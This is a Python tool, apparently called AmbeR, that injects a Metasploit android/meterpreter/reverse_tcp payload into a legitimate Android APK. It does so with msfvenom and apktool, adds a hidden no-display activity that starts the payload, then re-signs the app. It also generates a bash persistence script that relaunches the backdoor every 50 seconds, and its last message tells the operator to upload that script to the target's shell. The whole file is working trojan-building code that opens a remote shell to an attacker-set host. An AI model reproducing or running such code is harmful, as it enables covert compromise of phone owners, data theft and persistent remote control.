import subprocess
import os
import time
import shutil
import shlex
import sys, getopt,platform

TGREEN =  '\033[32m' # Green Text
TRED =  '\033[31m' # RED Text
TWHITE = '\033[37m' # White Text
TAQUA = '\033[36m' # Aqua Text
ENDC = '\033[m' # reset to the defaults
inputfile = 0
outputfile = 0
lhost = 0
lport = 0
script_out = 0
debug = 0
hlp =''' Usage: python amber [options] [options]
  Options:
  -l [ipadr], --LHOST [ipadr]: Set the lhost ipaddress of the payload
  -p [port],  --LPORT [port] : Set the port which the payload communicates to
  -i [file_location], --input [file_location] : The input file location
  -o [destination_location], --output [destination_location] : The output file name and location,defaults to
                                                               the program directory saved as output.apk
  -s [destination_location], --script_out [destination_location] : The location of the persistence script to be saved to,defaults to program
                                                                   directory saved as script.sh Note! this should end in '.sh' with filename
  -h, --help : Displays this help dialogue'''

def help_interface():
 global hlp
 print(TWHITE +"     _              _          ____  ")
 print("    / \   _ __ ___ | |__   ___|  _ \ ")
 print("   / _ \ | '_ ` _ \| '_ \ / _ \ |_) |")
 print("  / ___ \| | | | | | |_) |  __/  _ < ")
 print(" /_/   \_\_| |_| |_|_.__/ \___|_| \_\ " + ENDC)
 print("  -----------------------------------")
 print(" Version:1.1")
 print(hlp)
 exit()

def main_interface(argv):
 global hlp
 print(TWHITE +"     _              _          ____  ")
 print("    / \   _ __ ___ | |__   ___|  _ \ ")
 print("   / _ \ | '_ ` _ \| '_ \ / _ \ |_) |")
 print("  / ___ \| | | | | | |_) |  __/  _ < ")
 print(" /_/   \_\_| |_| |_|_.__/ \___|_| \_\ " + ENDC)
 print("  -----------------------------------")
 print(TAQUA + "  Android Injection Script by SunRider" + ENDC)
 print("")	
 try:
   opts, args = getopt.getopt(argv,"l:p:i:o:s:h",["LHOST=","LPORT=","input=","output=","script_out=","help"])
 except getopt.GetoptError as e:
   print(" "+e)
   print(" Syntax Error")
   print(hlp)
   sys.exit(2)
 global inputfile ,outputfile ,lhost ,lport ,script_out ,debug
 for opt, arg in opts:
      if opt in ('-h',"--help"):
         help_interface()
         sys.exit()
      elif opt in ("-i", "--input"):
         inputfile = arg
	 debug += 1
      elif opt in ("-o", "--output"):
         outputfile = arg
      elif opt in ("-l", "--LHOST"):
         lhost = arg
         debug += 1
      elif opt in ("-p", "--LPORT"):
         lport = arg
         debug += 1
      elif opt in ("-s", "--script_out"):
         script_out = arg
 if not debug == 3:
  print(" Syntax Error")
  print(hlp)
  sys.exit(2)
 print("")
 start_process()
 exit()

def cmd_exists(cmd):
    return any(
        os.access(os.path.join(path, cmd), os.X_OK) 
        for path in os.environ["PATH"].split(os.pathsep)
    )

def runcommand (cmd):
    proc = subprocess.Popen(cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True,
                            universal_newlines=True)
    std_out, std_err = proc.communicate()
    return proc.returncode, std_out, std_err

def intro_interface():
 print(TWHITE +"     _              _          ____  ")
 print("    / \   _ __ ___ | |__   ___|  _ \ ")
 print("   / _ \ | '_ ` _ \| '_ \ / _ \ |_) |")
 print("  / ___ \| | | | | | |_) |  __/  _ < ")
 print(" /_/   \_\_| |_| |_|_.__/ \___|_| \_\ " + ENDC)
 print("")
 print("")
 print(TGREEN + " [+] Checking aapt" + ENDC)
 if not cmd_exists('aapt'):
  print("")
  print(TRED+ " [-] aapt not found " + ENDC)
  time.sleep(5)
  exit() 

 print(TGREEN + " [+] Checking d2j-apk-sign" + ENDC)
 if not cmd_exists('d2j-apk-sign'):
  print("")
  print(TRED+ " [-] d2j-apk-sign not found " + ENDC)
  time.sleep(5)
  exit() 

 print(TGREEN + " [+] Checking apktool" + ENDC)
 if not cmd_exists('apktool'):
  print("")
  print(TRED+ " [-] apktool not found " + ENDC)
  time.sleep(5)
  exit() 

 print(TGREEN + " [+] Checking msf" + ENDC)
 if not cmd_exists('msfconsole'):
  print("")
  print(TRED+ " [-] Metasploit not found " + ENDC)
  time.sleep(5)
  exit()
 os.system('cls||clear')

def start_process():
 global inputfile ,outputfile ,lhost ,lport ,script_out ,debug
 if not os.path.isfile(inputfile) :
  print(" [-] File path not exists") 
  exit()
 file_path = inputfile
 code,returnvalue,error = runcommand("aapt d badging "+file_path)
 if not code == 0 :
  print(TRED+" [-] Please Enter valid file" +ENDC)
  exit()

 if os.path.exists(os.getcwd()+"/tmp/") :shutil.rmtree( os.getcwd()+"/tmp/")
 os.mkdir(os.getcwd()+"/tmp/")
 shutil.copy(file_path, os.getcwd()+"/tmp/")
 drive, path = os.path.splitdrive(file_path)
 path, filename = os.path.split(path)
 print(TRED +" [-] Setting LHOST as:"+lhost+ENDC)
 print(TRED +" [-] Setting LPORT as:"+lport +ENDC)
 print(TGREEN +" [+] Initializing msfmodule (Please wait this may take some time)")
 command = "msfvenom -x ./tmp/"+filename+" -p android/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -o ./tmp/injected_"+filename
 subprocess.call(['xterm', '-e', command])
 print(" [+] Completed msfmodule")
 print(" [+] Launching decompilers")
 subprocess.call(['xterm', '-e', "apktool d -f ./tmp/injected_"+filename +" -o ./tmp/injected_decomplied"])
 subprocess.call(['xterm', '-e', "apktool d -f ./tmp/"+filename +" -o ./tmp/original_decomplied"])
 print(" [+] Completed Decompilation")
 print(" [+] Adding tags")
 exitcode,data,err = runcommand("diff ./tmp/injected_decomplied/AndroidManifest.xml ./tmp/original_decomplied/AndroidManifest.xml |grep 'receiver android:label'")
 exitcode,data2,err = runcommand('diff ./tmp/injected_decomplied/AndroidManifest.xml ./tmp/original_decomplied/AndroidManifest.xml |grep "service"')
 data2 = data2[data2.index('android:name="')+len('android:name="'):data2.index('"/>')]
 data = data[data.index('android:name="')+len('android:name="'):data.index('">')]
 d,p = os.path.splitdrive(os.getcwd()+"/tmp/injected_decomplied/smali/"+data.replace(".","/")+".smali")
 p,fn = os.path.split(p) 
 main_activity = '''.class public $$1;
.super Landroid/app/Activity;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-static {p0}, $$2;->startService(Landroid/content/Context;)V

    invoke-virtual {p0}, $$1;->finish()V

    return-void
.end method'''
 with open(p+"/MainActivity.smali",'w') as write_file:
  write_file.write(main_activity)
 d1,p1 = os.path.splitdrive(data.replace(".","/")+".smali")
 p1,fn1 = os.path.split(p1) 
 content = []
 filer = p+"/MainActivity.smali"
 with open(filer,'r') as read_file :
  content = read_file.readlines()

 with open(filer,'w') as write_file:
  for line in content:
   line = line.replace("$$2","L"+data2.replace(".","/"))
   line = line.replace("$$1","L"+p1+"/MainActivity")
   write_file.write(line)

 filer = "./tmp/injected_decomplied/AndroidManifest.xml"
 txt ='    <activity android:label="@string/console" android:name="'+p1.replace("/",".")+".MainActivity" +'''" android:theme="@android:style/Theme.NoDisplay">
        <intent-filter>
           <action android:name="android.intent.action.MAIN" />
           <action android:name="'''+p1.replace("/",".")+".MainActivity"+'''" />
        </intent-filter>
        <intent-filter>
           <data android:host="my_host" android:scheme="metasploit" />
           <category android:name="android.intent.category.BROWSABLE" />
           <action android:name="android.intent.action.VIEW" />
        </intent-filter>
   </activity>
</manifest>'''
 with open(filer) as f_old, open("AndroidManifest.xml", "w") as f_new:
    for line in f_old:
        if not '</manifest>' in line: f_new.write(line)
        if '</manifest>' in line:
            f_new.write(txt)

 filer = "./tmp/injected_decomplied/res/values/strings.xml"
 txt ='    <string name="console">Console</string>'
 with open(filer) as f_old, open("strings.xml", "w") as f_new:
    for line in f_old:
        if not '</resources>' in line: f_new.write(line)
        if '</resources>' in line:
            f_new.write(txt +"\n </resources>")

 shutil.move(os.path.join(os.getcwd(), "strings.xml"), os.path.join(os.getcwd()+"/tmp/injected_decomplied/res/values/","strings.xml"))
 shutil.move(os.path.join(os.getcwd(), "AndroidManifest.xml"), os.path.join(os.getcwd()+"/tmp/injected_decomplied/","AndroidManifest.xml"))
 print(" [+] Recompiling files")
 if outputfile == 0 : outputfile = "output.apk"
 if os.path.isfile(outputfile) : os.remove(outputfile)
 if script_out == 0 :script_out = "script.sh"
 if os.path.isfile(script_out) : os.remove(script_out)
 subprocess.call(['xterm', '-e', "apktool b -f ./tmp/injected_decomplied -o "+outputfile])
 persistence = p1.replace("/",".")+".MainActivity"
 exitcode,data2,err = runcommand('aapt d badging '+ outputfile +' |grep "package"')
 data2 = data2[data2.index("package: name='")+len("package: name='"):data2.index("' ")]
 script = '''#!/bin/bash
while true
do am start --user 0 -a android.intent.action.MAIN -n ''' + data2+'/'+persistence +'''
sleep 50
done'''
 with open(script_out,'w') as write_file:
   write_file.write(script)
 print(" [+] Signing apks")
 exitcode,data2,err = runcommand('d2j-apk-sign -f "'+ outputfile +'" -o main.apk')
 if os.path.isfile(outputfile) :os.remove(outputfile)
 shutil.copy("main.apk", outputfile)    
 print(" [+] Cleaning up used resources")
 if os.path.isfile("AndroidManifest.xml") :os.remove("AndroidManifest.xml")
 if os.path.isfile("strings.xml") :os.remove("strings.xml")
 if os.path.isfile("main.apk") :os.remove("main.apk")
 shutil.rmtree( os.getcwd()+"/tmp/")
 print(TGREEN + " [+] Package exported to:" + outputfile)
 print( " [+] Script exported to:" + script_out)
 print( " [!] In the shell window of the target Upload the script and enter ' setsid <scriptname.sh> & ' to gain persistence") 
 exit()

intro_interface()
if __name__ == "__main__":
   main_interface(sys.argv[1:])

